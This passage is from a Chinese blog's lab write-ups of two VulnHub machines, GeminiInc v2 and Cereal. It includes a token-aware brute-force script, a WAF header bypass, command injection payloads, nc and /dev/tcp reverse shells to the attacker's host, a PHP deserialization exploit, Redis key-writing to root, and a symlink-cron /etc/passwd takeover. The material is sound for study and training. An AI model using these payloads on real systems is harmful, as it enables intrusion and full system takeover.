<p>在网上找到别人写的一个脚本： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">url=<span class="string">&quot;http://192.168.100.21/activate.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> &#123;000000..999999&#125;; <span class="keyword">do</span></span><br><span class="line">    token=$(curl -s -c cookie <span class="variable">$url</span> | awk -F <span class="string">&#x27;value=&#x27;</span> <span class="string">&#x27;/token/ &#123;print $2&#125;&#x27;</span> | cut -d <span class="string">&quot;&#x27;&quot;</span> -f2)</span><br><span class="line">    resp=$(curl -s -w %&#123;http_code&#125; -b cookie --data <span class="string">&quot;userid=14&amp;activation_code=<span class="variable">$key</span>&amp;token=<span class="variable">$&#123;token&#125;</span>&quot;</span> <span class="variable">$url</span> | tail -n 1 | cut -d <span class="string">&quot;&gt;&quot;</span> -f2)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$resp</span> -ne 403 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Key = &quot;</span><span class="variable">$key</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>修改靶机的ip，然后执行，等待一段时间后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀hdfzzf)-[~]</span><br><span class="line">└─<span class="comment"># ./geminiinc2.sh                                                                                   </span></span><br><span class="line">Key = 000511</span><br></pre></td></tr></table></figure></p>
<p>此时将得到的code提交即可激活。</p>
<h3 id="方法2">2.2.2. 方法2</h3>
<p>利用burp爆破，不过有点麻烦，需要设置许多东西。</p>
<ol type="1">
<li><p>将 Attack Type 设置成 Pitchfork</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213421.png" /></p></li>
<li><p>设置第一个参数为numbers，并且整数部分的最大、最小长度都设置为6，因为必须是6为的数字</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213554.png" /></p></li>
<li><p>设置第二个参数为，然后来到Options -&gt; Grep-Payload -&gt;
add（只需要选中即可，burp会自动识别开始地方和结束地方）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213734.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213821.png" /></p></li>
<li><p>Resource Pool中线程设置为1</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214056.png" /></p></li>
<li><p>Options中的错误重试设置为0</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214121.png" /></p></li>
</ol>
<p>注意：</p>
<ol type="1">
<li>每一步都要设置！！！</li>
<li>线程必须为1，因为我们需要捕捉token然后再发送下一个请求，无法多线程</li>
<li>最好用pro版本，会快一点</li>
</ol>
<p>我做演示就不从0开始了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214312.png" /></p>
<p>可以看到payload为000511的时候，状态码为302，并且下一个payload没有token了，这是因为000511是对的，此时被重定向到根目录了，所以不会再次产生token。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>进去之后，首先尝试了一下1的漏洞还在不在，发现不在了。接下来进行信息收集，只有一个User
List</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214535.png" /></p>
<p>经过一定时间观察，只有黄色名字的用户是administrator，其他都是member，并且个人账户的页面源码中会有password的注释</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214637.png" /></p>
<p>查看了自己新建立的用户，并且自己的密码sha1加密之后的值和其一样，因此合理推测，administrator源码中的密码就是管理员的登录密码。找一个在线解密的平台解密得到密码为：secretpassword</p>
<p>然后直接登录。需要注意username和display name！</p>
<p>进入到管理员的后台之后，发现多了两个功能</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215436.png" /></p>
<p>其中命令执行让我打起了精神，但是直接访问是空白，我们抓包看一下发生了什么事</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215535.png" /></p>
<p>注意到侠士 IP NOT ALLOW，也就是后台可能开启了WAF，因此需要加入
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1 </span><br></pre></td></tr></table></figure></p>
<p>也可以加入其他头部。因为每个包都需要加这个，直接使用burp设置一下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215719.png" /></p>
<p>然后勾选上就可以了，这样子每个包burp就会自动添加上该头部。当然也可以用burp的插件，Bypass
WAF，原理一样，自行搜索。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215817.png" /></p>
<p>发现确实显示出了东西。但是这里执行的命令不会回显，只会显示</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215850.png" /></p>
<p>并且，过滤了空格和cat（可能还有其他被过滤了，但是我比较关注这两个）空格其实比较好绕过，可以用%09代替，或者IFS。但是%09需要在burp里面修改，不能够直接在输入框里面，否则会再次被url编码，这里也推测出，后台还过滤了%。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220155.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220211.png" /></p>
<p>那么可以直接通过这里执行nc，反弹shell即可。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220352.png" /></p>
<p>发现靶机上没有nc，但是kali上有，可以通过靶机的命令执行，下载kali的nc然后反弹。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali:</span><br><span class="line">1. <span class="built_in">cd</span> /usr/bin</span><br><span class="line">2. python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">1. wget%09http://192.168.100.10:80/nc%09-O%09/tmp/nc <span class="comment"># 将nc保存到/tmp下面</span></span><br></pre></td></tr></table></figure></p>
<p>然后执行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod%09%2bx%09/tmp/nc</span><br><span class="line">/tmp/nc%09192.168.100.10%094444%09-e%09/bin/bash</span><br></pre></td></tr></table></figure></p>
<p>注意：</p>
<ol type="1">
<li>chmod +x
/tmp/nc的时候，如果直接在输入框输入，只需要修改空格为%09即可。因为自动会把+
url编码；如果在burp输入，需要把 + url编码，因为在burp中+就是空格；</li>
</ol>
<p>成功得到shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">gemini1@geminiinc:/var/www/html$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(gemini1) gid=1000(gemini1) groups=1000(gemini1),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br></pre></td></tr></table></figure>
<h3 id="番外">2.3.1. 番外</h3>
<p>其实除了使用%09代替空格之外，还可以使用IFS，[[远程命令、代码执行总结（PHP）]]</p>
<p>在传完nc之后，执行： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IFS=:;val=/tmp/nc:192.168.100.10:4444:-e:/bin/bash;<span class="variable">$val</span></span><br></pre></td></tr></table></figure></p>
<p>也可以反弹shell。IFS=:的作用是将:全都转为空格。</p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>经过信息收集，发现没有suid、内核等常用的提权，但是在查看端口的时候发现开了6379端口，这是redis使用的端口，而redis又存在着许多漏洞。除此之外，还开起了3306，这是MySQL默认的端口。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503221607.png" /></p>
<p>这里需要注意现在获得的shell是不能够进行交互的，如果直接连接redis就会出不来，因此下面需要利用ssh登录获得完整的shell。但是我们不知道密码该怎么办呢？其实很简单，通过对端口服务的发现，可以猜测ssh可能可以ssh公钥认证登录。</p>
<p>先在kali上生成公私钥 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure></p>
<p>然后将公钥发送到靶机，并且保存为/home/gemini1/.ssh/authorized_keys
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">1. mkdir .ssh</span><br><span class="line">2. <span class="built_in">cd</span> .ssh</span><br><span class="line">3. /tmp/nc -lvnp 4444 &gt; authorized_keys</span><br><span class="line"></span><br><span class="line">kalil:</span><br><span class="line">1. nc 192.168.100.21 4444 &lt; id_rsa.pub -w 1</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">1. chmod 600 authorized_keys</span><br><span class="line"></span><br><span class="line">kali:</span><br><span class="line">1. ssh gemini1@192.168.100.21 -i id_rsa</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503222619.png" /></p>
<p>我对redis的漏洞不熟，这里演示一下该漏洞的利用。</p>
<p>首先查看redis的配置文件，默认在/etc/redis <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/redis/6379.conf</span><br></pre></td></tr></table></figure></p>
<p>内容非常的多，要仔细看，发现了下面这段话</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503223106.png" /></p>
<p>有一个requirepass:
8a7b86a2cd89d96dfcc125ebcc0535e6。接下来就一步一步操作。</p>
<ol type="1">
<li><p>将authorized_keys转为txt格式，也就是redis能够识别的格式
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat authorized_keys; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; pub.txt</span><br></pre></td></tr></table></figure></p></li>
<li><p>将pub.txt的内容传入redis，作为一个键 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat pub.txt | redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x <span class="built_in">set</span> ssh_key <span class="comment"># 键名可以随意</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>连接到redis，并且进行相关配置 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 <span class="comment"># 登录redis</span></span><br><span class="line">2. config <span class="built_in">set</span> dir /root/.ssh <span class="comment"># 设置默认数据库目录为/root/.ssh</span></span><br><span class="line">3. config <span class="built_in">set</span> dbfilename authorized_keys <span class="comment"># 设置默认数据库名为authorized_keys</span></span><br><span class="line">4. save <span class="comment"># 导出</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<p>然后利用ssh登录root即可，密钥不变。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀hdfzzf)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa root@192.168.100.21</span></span><br><span class="line">Linux geminiinc 4.9.0-5-amd64 <span class="comment">#1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Tue May  3 10:49:01 2022 from ::1</span><br><span class="line">root@geminiinc:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
<p>最后读取flag： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// /root/flag.txt</span><br><span class="line"></span><br><span class="line"> ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______ </span><br><span class="line"> /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/ </span><br><span class="line">                                                                                                            </span><br><span class="line">                                                                                                            </span><br><span class="line">    _________                                     __        .__          __  .__                     ._.    </span><br><span class="line">    \_   ___ \  ____   ____    ________________ _/  |_ __ __|  | _____ _/  |_|__| ____   ____   _____| |    </span><br><span class="line">    /    \  \/ /  _ \ /    \  / ___\_  __ \__  \\   __\  |  \  | \__  \\   __\  |/  _ \ /    \ /  ___/ |    </span><br><span class="line">    \     \___(  &lt;_&gt; )   |  \/ /_/  &gt;  | \// __ \|  | |  |  /  |__/ __ \|  | |  (  &lt;_&gt; )   |  \\___ \ \|    </span><br><span class="line">     \______  /\____/|___|  /\___  /|__|  (____  /__| |____/|____(____  /__| |__|\____/|___|  /____  &gt;__    </span><br><span class="line">            \/            \//_____/            \/                     \/                    \/     \/ \/    </span><br><span class="line">                                                                                                            </span><br><span class="line">                                                                                                            </span><br><span class="line">  ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______ </span><br><span class="line"> /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/ </span><br><span class="line">                                                                                                            </span><br><span class="line">                                                                                                            </span><br><span class="line">Did you had fun? :)</span><br><span class="line">https://scriptkidd1e.wordpress.com</span><br><span class="line"></span><br><span class="line">Tweet me your writeup!</span><br><span class="line">https://twitter.com/sec_9emin1</span><br><span class="line"></span><br><span class="line">  ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______</span><br><span class="line"> /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机怎么说呢，对我来说难度很高，因为我对redis不是很熟悉，并且在爆破code的时候也耽误了很久。</p>
<p>不过通过对该靶机的渗透让我觉得，只要是第三方服务，都有可能存在漏洞，尤其关注配置文件。</p>
<p>还有一点，路径扫描多用不同工具扫！！！</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>WAF Bypass</tag>
        <tag>Anto CSRF token</tag>
        <tag>隐藏路径爬取</tag>
        <tag>redis漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>21 Vulnhub Cereal Writeup</title>
    <url>/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/</url>
    <content><![CDATA[<p>该靶机难度我认为很高，比较贴近真实场景，尤其是权限提升的时候，需要一定的耐心和细心。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/cereal-1,703/">Cereal: 1 ~
VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>高（接近真实场景）</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>路径枚举</li>
<li>密码爆破</li>
<li>域名解析</li>
<li>匿名FTP</li>
<li><strong>子域名爆破</strong></li>
<li>源码审计</li>
<li>反序列化漏洞</li>
<li><strong>进程监视</strong></li>
<li>软链接</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.25</span><br><span class="line">sudo nmap -p21,22,80,139,445,3306,11111,22222,22223,33333,44441,44444,55551,55555 -A 10.0.2.25</span><br></pre></td></tr></table></figure>
<p>该靶机开放的端口很多。信息如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">11111/tcp open  vce</span><br><span class="line">22222/tcp open  easyengine</span><br><span class="line">22223/tcp open  unknown</span><br><span class="line">33333/tcp open  dgi-serv</span><br><span class="line">33334/tcp open  speedtrace</span><br><span class="line">44441/tcp open  unknown</span><br><span class="line">44444/tcp open  cognex-dataman</span><br><span class="line">55551/tcp open  unknown</span><br><span class="line">55555/tcp open  unknown</span><br></pre></td></tr></table></figure></p>
<p>可以一一对各个端口的服务进行查看。</p>
<p>首先查看21端口，利用-A参数知道可以匿名登录，因此使用下面命令连接
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ftp 10.0.2.25</span><br><span class="line">2. Anonymous</span><br><span class="line">3. 密码为空，直接回车</span><br></pre></td></tr></table></figure></p>
<p>只有一个pub目录，并且该目录为空，尝试上传文件也失败了
<figure class="highlight plaintext"><figcaption><span>put hello.txt</span></figcaption><table><tr><td class="code"><pre><span class="line">local: hello.txt remote: hello.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||56531|)</span><br><span class="line">550 Permission denied.</span><br></pre></td></tr></table></figure></p>
<p>因此尝试其他端口。</p>
<p>其中139和445端口上的服务可能是mssql，经查看没有可利用的地方；3306禁止kali的ip连接，可能没有开启外连；44441和80端口的服务都是http，其他端口虽然开放，也可以用nc连接的上，但是无论输入任何命令，服务器都不会有响应，因此，这些端口可能只是一个幌子，还有可能是蜜罐。</p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<h3 id="端口">2.2.1. 80端口</h3>
<p>直接访问，发现这就是apache的一个默认界面，但是，知道了靶机的操作系统为Rocky
Linux。接着查看源码、抓包都没有什么有用的信息，因此直接进行目录扫描。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.25 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505095018.png" /></p>
<p>注意到两个可以的目录: admin, blog。</p>
<p>首先是admin，这是一个登录界面，可以尝试对其进行爆破，但是最终一无所获。对其再次进行路径扫描，并没有发现有用的信息。</p>
<p>后者是得到一个界面，该界面中主要有3个信息：</p>
<ol type="1">
<li>一个域名：cereal.ctf</li>
<li>搜索框</li>
<li>back up，也就是说cereal.ctf下面可能存在备份信息</li>
</ol>
<p>尝试对搜索框进行测试，并没有漏洞。对blog进行路径扫描，会发现许多文件，但一一查看之后，并没有可以利用的。在测试过程中，发现许多的功能都转到了cereal.ctf下，因此尝试将其加入到/etc/hosts之后再次进行尝试，还是一无所获。</p>
<h3 id="端口-1">2.2.2. 44441端口</h3>
<p>页面非常简单，就一句话 "Coming soon..."，因此对该目录进行路径扫描
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.25:44441/ -w /usr/share/dirb/wordlists/common.txt </span><br></pre></td></tr></table></figure></p>
<p>没有找到任何有用的信息，如果使用域名呢？ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://cereal.ctf:44441/ -w /usr/share/dirb/wordlists/common.txt </span><br></pre></td></tr></table></figure></p>
<p>与上面的一样，没有任何有用的信息。联想到，既然靶机给了我们一个域名，那是不是存在子域名？因此尝试扫描一下是否有子域名：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://cereal.ctf:44441/ -t 20 -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt|grep <span class="string">&quot;Status: 200&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>得到一个 secure.cereal.ctf 子域名，将其添加到hosts中，然后访问</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505102057.png" /></p>
<p>终于得到一个功能点，这看起来像是执行了系统命令ping，因此后台可能存在着命令执行的漏洞，但是输入<code>127.0.0.1;ls</code>时，结果是空白，应该是做了一定的过滤。</p>
<p>对其进行路径扫描，得到一个/php，直接访问它，发现了一个值得怀疑的点，那就是该文件第一行就是定义了一个序列化的函数。我们抓包查看一下我们点击ping时的数据</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505102517.png" /></p>
<p>经过url
decode，原来真的是经过了序列化之后的数据。反序列化的漏洞很难在黑盒的情况下进行利用，所以我们需要找到源码，联想到刚刚有一个备份文件没有找到,这里换一个工具进行扫描，gobuster我没扫出来：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ </span><br></pre></td></tr></table></figure></p>
<p>扫描出一个 back_en
目录，该目录不让直接访问，扫描一下该目录下是是否存在备份文件
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://secure.cereal.ctf:44441/back_en</span><br></pre></td></tr></table></figure></p>
<p>（感觉扫常规的目录和文件，dirsearch更快）扫出一个index.php.bak，直接访问查看源码，得到如下php代码：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = <span class="literal">False</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isValid) &#123;</span><br><span class="line">			<span class="keyword">if</span> (filter_var(<span class="keyword">$this</span>-&gt;ipAddress, FILTER_VALIDATE_IP))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;isValid = <span class="literal">True</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ping();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isValid) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;output = shell_exec(<span class="string">&quot;ping -c 3 <span class="subst">$this</span>-&gt;ipAddress&quot;</span>);	</span><br><span class="line">		&#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = unserialize(urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = <span class="keyword">new</span> pingTest;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pingTest</span>-&gt;validate();</span><br></pre></td></tr></table></figure></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>通过代码审计可以得知，如果输入127.0.0.1;ls，那么无法通过validate()的过滤，但是只要
isValid 为True就可以直接绕过过滤函数，因此构造方法也很简单：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1;id&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = <span class="literal">True</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> pingTest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$obj</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505105448.png" /></p>
<p>命令被成功执行。然后我使用了which
nc，发现没有回显，还以为没有nc，但是 nc 10.0.2.4 3333
时却可以连接到我的主机，所以其实是有nc的，直接通过nc反弹shell。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505105659.png" /></p>
<p>还可以通过下面的命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|bash -i &gt;&amp; /dev/tcp/10.0.2.4/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>重点在后半句，解释如下：</p>
<table>
<thead>
<tr class="header">
<th>命令</th>
<th>详解</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>bash -i</td>
<td>产生一个bash环境</td>
</tr>
<tr class="even">
<td><code>&gt;&amp;</code></td>
<td>将&amp;前面的内容与后面的内容相结合，然后一起重定向给后者</td>
</tr>
<tr class="odd">
<td>/dev/tcp/ip/port</td>
<td>让目标主机与攻击机ip的port建立一个tcp连接</td>
</tr>
<tr class="even">
<td>0&gt;&amp;1</td>
<td>将标准输入与标准输出内容相结合，然后重定向给标准输出</td>
</tr>
</tbody>
</table>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>首先进行常规的一些信息收集，内核、sudo，suid，都没有可以使用的点。查看端口和进程也没有可以利用的。与bash有关的用户只有两个:
rocky, root。</p>
<p>这里的提权使用到之前没有用过的方法，<strong>就是通过监视进程的产生，从而确定产生该进程的命令，然后利用这些命令中涉及到的脚本/程序来提权</strong>。首先需要一个工具
pspy64 或者 linpeas.sh（这个好像是一个信息收集的工具）</p>
<ul>
<li><a href="https://github.com/carlospolop/PEASS-ng/releases">Releases
· carlospolop/PEASS-ng · GitHub</a></li>
<li><a href="https://github.com/DominicBreuker/pspy">GitHub -
DominicBreuker/pspy: Monitor linux processes without root
permissions</a></li>
</ul>
<p>先在kali下载，然后通过nc传到靶机，并给予执行权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./pspy</span><br></pre></td></tr></table></figure>
<p>注意到有这么一行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMD: UID=0    PID=24316  | /bin/bash /usr/share/scripts/chown.sh</span><br></pre></td></tr></table></figure></p>
<p>该脚本由root运行，并且看这名字像是更改属主的脚本，通过
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -l /usr/share/scripts/chown.sh</span><br><span class="line">-rw-r--r--. 1 root root 45 May 29  2021 /usr/share/scripts/chown.sh</span><br></pre></td></tr></table></figure></p>
<p>发现我们拥有读的权限。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /usr/share/scripts/chown.sh</span><br><span class="line"></span><br><span class="line">chown rocky:apache /home/rocky/public_html/*</span><br></pre></td></tr></table></figure></p>
<p>该脚本的作用就是将/home/rocky/public_html/目录下面的所有文件的属主改为rocky，所有组改为apache。</p>
<p>并且该脚本并不是指运行一次：（我一直开着pspy监视进程）
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2022/05/05 04:20:01 CMD: UID=0    PID=24316  | /bin/bash /usr/share/scripts/chown.sh</span><br><span class="line">2022/05/05 04:30:01 CMD: UID=0    PID=24389  | /bin/bash /usr/share/scripts/chown.sh </span><br><span class="line">2022/05/05 04:40:01 CMD: UID=0    PID=42855  | /bin/bash /usr/share/scripts/chown.sh </span><br></pre></td></tr></table></figure></p>
<p>从执行时间可以看到，好像是每隔10分钟就会自动执行一次，这让我想到了cron，那如何利用这个呢？</p>
<blockquote>
<p>这里有一个重要的关于Linux的知识点：<strong>修改软链接的所有者/组的话，也会修改所链接的文件的所有者/组。</strong></p>
</blockquote>
<p>利用方法如下：</p>
<ol type="1">
<li>可以设置一个软链接指向/etc/passwd</li>
<li>然后把该链接放在/home/rocky/public_html/目录下</li>
<li>每过10分钟，chown.sh就会修改/home/rocky/public_html/目录下所有文件的所有者/组，也就把软链接的所有者/组给修改了</li>
<li>那么我们就可以随意的修改/etc/passwd的内容，比如添加一个uid和gid为0的用户，也就是root</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. <span class="built_in">cd</span> /home/rocky/public_html/</span><br><span class="line">2. ln -sf /etc/passwd ./passwd</span><br><span class="line"></span><br><span class="line">等到 2022/05/05 04:50:01 CMD: UID=0    PID=42906  | /bin/bash /usr/share/scripts/chown.sh</span><br><span class="line"></span><br><span class="line">3. ls -l /etc/passwd <span class="comment"># 查看权限</span></span><br><span class="line">4. <span class="built_in">echo</span> <span class="string">&quot;m1ku::0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd  <span class="comment"># 添加一个root用户，注意密码为空</span></span><br><span class="line">5. su m1ku</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505115315.png" /></p>
